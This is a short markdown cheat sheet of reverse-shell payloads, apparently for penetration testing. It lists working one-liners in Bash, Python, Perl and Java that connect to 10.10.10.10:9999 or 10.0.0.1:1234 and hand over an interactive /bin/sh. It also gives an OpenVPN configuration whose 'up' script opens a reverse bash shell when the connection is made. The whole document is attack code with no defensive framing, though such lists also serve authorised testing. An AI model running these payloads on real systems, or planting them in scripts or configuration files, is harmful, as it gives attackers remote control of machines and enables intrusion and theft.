
# Table of contents

1. [Bash](#bash)
2. [Python](#python)
3. [Perl](#perl)
4. [Java](#java)
5. [OpenVPN](#openvpn)




## Bash

> bash -i >& /dev/tcp/10.10.10.10/9999 0>&1


## Python

> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```
#Same but prettier
	import socket
	import subprocess
	import os

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("10.0.0.1",1234))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(["/bin/sh","-i"])

```


## Perl

> perl -e 'use Socket;$i="10.10.10.10";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```
	#Same but prettier
	use Socket;
	$i="10.0.0.1";
	$p=1234;
	socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
	if(connect(S,sockaddr_in($p,inet_aton($i)))){
		open(STDIN,">&S");
		open(STDOUT,">&S");
		open(STDERR,">&S");
		exec("/bin/sh -i");
};

```


## Java

```
r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/9999;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()
```

## OpenVPN

This will execute the command on the vpn server when the connection is made, please, replace the "<<things>>" (: !

```
remote <<VPNSERVER>>
ifconfig <<ip to assign>> <<ip to assign>>
dev tun
script-security 2
up "/bin/bash -c '/bin/bash -i &> /dev/tcp/10.10.10.10/9999 0<&1 2>&1&'"
nobind
```
